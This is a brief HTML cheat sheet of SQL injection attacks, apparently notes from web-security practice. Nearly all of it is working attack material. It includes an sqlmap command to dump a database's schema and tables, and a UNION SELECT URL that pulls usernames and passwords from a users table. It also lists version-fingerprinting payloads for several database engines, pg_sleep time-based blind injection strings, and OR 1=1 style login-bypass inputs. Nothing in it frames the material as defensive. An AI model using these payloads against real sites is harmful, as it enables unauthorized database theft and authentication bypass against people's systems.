<h1>SQL Injection</h1>

<p>-- o #</p>

<h2>Reflected SQL Injection:</h2>
<code>sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns</code>

<p>Database: public</p>
<p>Table: users</p>

<h4>POC</h4>
<code>https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--</code>

<h5>Version</h5>
<p>First detect numbers of columns</p>
<p><code>' UNION SELECT NULL,@@version--</code></p>
<p><code>' UNION SELECT NULL,NULL,* FROM v$version--</code></p>
<p><code>' UNION SELECT banner FROM v$version--</code></p>
<p><code>' UNION SELECT version FROM v$instance--</code></p>
<p><code>' UNION SELECT version()--</code></p>

<h2>Blind SQL Injection:</h2>
<p><code>';SELECT PG_SLEEP(5)--</code></p>
<p><code>'||pg_sleep(10)--</code></p>

Input login, in name, password try:
name'--
pass'--

Always try with:
'+OR+1=1--
'+OR+2=2--
'+OR+5=5--
'+OR+'E'='E'--
